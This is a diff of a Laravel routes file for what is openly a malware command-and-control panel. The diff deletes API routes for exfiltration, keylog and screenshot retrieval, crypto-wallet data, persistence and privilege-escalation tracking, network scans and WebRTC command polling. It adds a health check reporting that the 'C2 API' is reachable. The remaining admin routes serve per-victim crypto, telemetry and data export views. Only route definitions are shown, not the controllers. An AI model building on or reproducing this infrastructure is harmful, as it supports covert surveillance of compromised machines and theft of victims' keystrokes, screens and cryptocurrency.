@@ -24,36 +24,7 @@ Route::get('/admin/crypto/{terminalId}', [App\Http\Controllers\Admin\AdminContro
 Route::get('/admin/telemetry/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'telemetryView'])->name('admin.telemetry');
 Route::get('/admin/export/{terminalId}/{type}', [App\Http\Controllers\Admin\AdminController::class, 'exportData'])->name('admin.export');
 
-// API Routes for C2
-Route::prefix('api')->group(function () {
-    // Terminal communication
-    Route::post('/status', [App\Http\Controllers\Api\C2Controller::class, 'statusUpdate']);
-    Route::post('/upload', [App\Http\Controllers\Api\C2Controller::class, 'upload']);
-    Route::post('/systeminfo', [App\Http\Controllers\Api\C2Controller::class, 'systemInfo']);
-    Route::post('/exfiltrate', [App\Http\Controllers\Api\C2Controller::class, 'exfiltrate']);
-    
-    // Data retrieval
-    Route::get('/terminals', [App\Http\Controllers\Api\C2Controller::class, 'listTerminals']);
-    Route::get('/livefeed/{id}', [App\Http\Controllers\Api\C2Controller::class, 'getLiveFeed']);
-    Route::get('/screenshots/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getScreenshots']);
-    Route::get('/keylogs/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getKeylogs']);
-    Route::get('/crypto/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getCryptoData']);
-    Route::get('/telemetry/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getTelemetry']);
-    Route::get('/timeline/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getTimeline']);
-    Route::get('/persistence/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getPersistenceAttempts']);
-    Route::get('/escalation/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getEscalationAttempts']);
-    Route::get('/network-scans/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getNetworkScans']);
-    
-    // WebRTC
-    Route::post('/webrtc/register', [App\Http\Controllers\Api\C2Controller::class, 'webrtcRegister']);
-    Route::post('/webrtc/heartbeat', [App\Http\Controllers\Api\C2Controller::class, 'webrtcHeartbeat']);
-    Route::get('/webrtc/commands/{sessionId}', [App\Http\Controllers\Api\C2Controller::class, 'webrtcPollCommands']);
-    Route::post('/webrtc/result', [App\Http\Controllers\Api\C2Controller::class, 'webrtcResult']);
-    
-    // Telemetry
-    Route::post('/telemetry/batch', [App\Http\Controllers\Api\C2Controller::class, 'receiveTelemetryBatch']);
-    Route::post('/logs', [App\Http\Controllers\Api\C2Controller::class, 'storeLogs']);
-    
-    // Updates
-    Route::get('/updates/check', [App\Http\Controllers\Api\C2Controller::class, 'checkForUpdates']);
+// Redirection for cleaner API access if needed or simple health check
+Route::get('/api-health', function() {
+    return response()->json(['status' => 'ok', 'message' => 'C2 API is reachable']);
 });
